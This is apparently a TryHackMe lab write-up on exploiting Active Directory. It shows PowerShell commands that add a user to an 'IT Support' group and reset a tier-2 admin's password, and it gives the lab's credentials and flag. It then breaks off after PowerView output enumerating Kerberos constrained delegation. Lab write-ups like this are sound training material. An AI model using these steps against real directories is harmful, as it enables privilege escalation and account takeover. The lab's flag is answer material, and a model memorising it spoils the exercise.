## Exploiting Active Directory

### Exploiting Permission Delegation 

``` Your credentials have been generated: Username: laura.wood Password: C6j4BhcW ```


Bloodhound shows misconfiguration in AD allowing Domain Users to add themselves to IT Support, which in turn delegates permission to reset a t2 admin password

![bloodhound](/TryHackMe/Exploiting%20AD%20Task%202.png)

```posh
#Add our user to IT Support
Add-ADGroupMember "IT Support" -Members "laura.wood"
```

```posh
#Verify user has been successfully added
Get-ADGroupMember -Identity "IT Support" 
```

Run ``` gpupdate /force ```  then reconnect to the remote session to ensure permissions propogate

```posh
#Reset password for a user in 
$Password = ConvertTo-SecureString "Password1" -AsPlainText -Force
Set-ADAccountPassword -Identity "t2_caroline.dawson" -Reset -NewPassword $Password
```

RDP from AttackBox to locate the flag

``` THM{Permission.Delegation.FTW!} ```

### Exploiting Kerberos Delegation

```console
PS C:\Users\laura.wood> Import-Module C:\Tools\PowerView.ps1 
PS C:\Users\laura.wood> Get-NetUser -TrustedToAuth 


logoncount               : 37
badpasswordtime          : 1/1/1601 12:00:00 AM
distinguishedname        : CN=IIS Server,CN=Users,DC=za,DC=tryhackme,DC=loc
objectclass              : {top, person, organizationalPerson, user}
displayname              : IIS Server
lastlogontimestamp       : 8/27/2022 8:35:32 PM
userprincipalname        : svcIIS@za.tryhackme.loc
name                     : IIS Server
objectsid                : S-1-5-21-3885271727-2693558621-2658995185-6155
samaccountname           : svcIIS
codepage                 : 0
samaccounttype           : USER_OBJECT
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 8/27/2022 7:35:32 PM
instancetype             : 4
usncreated               : 78494
objectguid               : 11e42287-0a25-4d73-800d-b62e2d2a2a4b
sn                       : Server
lastlogoff               : 1/1/1601 12:00:00 AM
msds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc, http/THMSERVER1} 
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dscorepropagationdata    : 1/1/1601 12:00:00 AM
serviceprincipalname     : HTTP/svcServWeb.za.tryhackme.loc
givenname                : IIS
lastlogon                : 8/28/2022 8:09:12 AM
badpwdcount              : 0
cn                       : IIS Server
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated              : 4/27/2022 11:26:21 AM
primarygroupid           : 513
pwdlastset               : 4/29/2022 11:50:25 AM
usnchanged               : 147502
```
